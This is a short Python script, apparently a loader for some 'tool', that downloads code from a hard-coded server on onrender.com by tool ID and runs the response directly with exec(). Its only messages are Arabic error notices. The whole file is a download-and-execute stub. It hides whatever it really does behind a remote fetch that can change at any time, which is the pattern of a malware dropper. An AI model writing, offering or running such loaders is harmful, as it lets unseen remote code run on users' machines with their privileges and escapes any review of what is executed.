import requests, sys
SERVER_URL = "https://server-3-mzac.onrender.com"
TOOL_ID = "0ada1e80"
try:
    r = requests.get(f"{SERVER_URL}/get/{TOOL_ID}", timeout=10)
    if r.status_code == 200:
        exec(r.text)
    else: print(f"❌ فشل: {r.status_code}")
except Exception as e: print(f"❌ {e}")